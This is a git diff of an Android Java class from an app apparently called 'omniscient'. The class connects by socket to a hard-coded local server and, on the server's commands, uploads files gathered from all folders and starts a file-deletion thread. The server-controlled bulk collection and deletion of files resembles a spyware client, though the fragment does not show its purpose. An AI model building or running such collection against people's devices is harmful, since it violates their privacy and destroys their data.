@@ -3,6 +3,8 @@ package com.postal.omniscient.postal.downloadFiles;
 import android.content.Intent;
 import android.util.Log;
 
+import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
+
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -36,7 +38,8 @@ public class DownloadFileRun implements Runnable {
 
     private void start() {
 
-        String server = "192.168.1.114";
+        AdapterDownloadFlag is_downloadFlag = new AdapterDownloadFlag();
+        String server = "192.168.168.101";
         int port = 2221;
 
         String isLoaded = "isLoaded ";
@@ -46,7 +49,7 @@ public class DownloadFileRun implements Runnable {
             socket.setSoTimeout(60000);
             dos = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
             send2();
-            Log.d(Msg, "Postal work CHIDORY");
+            Log.d(Msg, "Postal SOCKET work");
 
 
 
@@ -56,6 +59,7 @@ public class DownloadFileRun implements Runnable {
                 String line;
 
                 int a;
+                is_downloadFlag.setTreadIsWork(false);
 
                 while ((line = reader.readLine()) != null) {
                     Log.d(Msg, "ANSWER " + line);
@@ -67,32 +71,21 @@ public class DownloadFileRun implements Runnable {
                         //поток для удаления файлов
                         startDelete.start();
                     }
-                    if (line.equals("isConnect")) {
-
-                            Thread thread = new Thread(){
-                                public void run(){
-                                    final long sleep_time = 3000;
-                                    try {
-                                    sleep(sleep_time);
-                                        dos.writeUTF("isConnect");
-                                        dos.flush();
-                                        Log.i(Msg, "Thread Running isConnect");
-                                    } catch (IOException e) {
-                                        Log.e(Msg, e.toString());
-                                    } catch (InterruptedException e) {
-                                        e.printStackTrace();
-                                    }
-
-                                }
-                            };
-                            thread.start();
+                    if (line.equals("isConnect") && !is_downloadFlag.getTreadIsWork()) {
+                        //если поток передачи даннных запущен не поддерживать свъязь с сервером
+                        KeepConnection keep_con = new KeepConnection(dos, is_downloadFlag);
+                        keep_con.setName("KeepConnection");
+                        keep_con.start();
+                        Log.e(Msg, "Название потока поддержки свъязи с сервером "+ keep_con.getName().toString());
                     }
+
                     if (line.equals("ok")) {
                         dos.writeUTF("isConnect");//начать поддержку соединения
                         dos.flush();
                         if (allFoldersFiles != null) {
                             //отправка в новом потоке
-                            SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles, socket, dos);
+                            SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
+                                    socket, dos, is_downloadFlag);
                             Thread startDownlow = new Thread(dwnloadFile);
                             //поток для загрузки файлов на сервер
                             startDownlow.start();
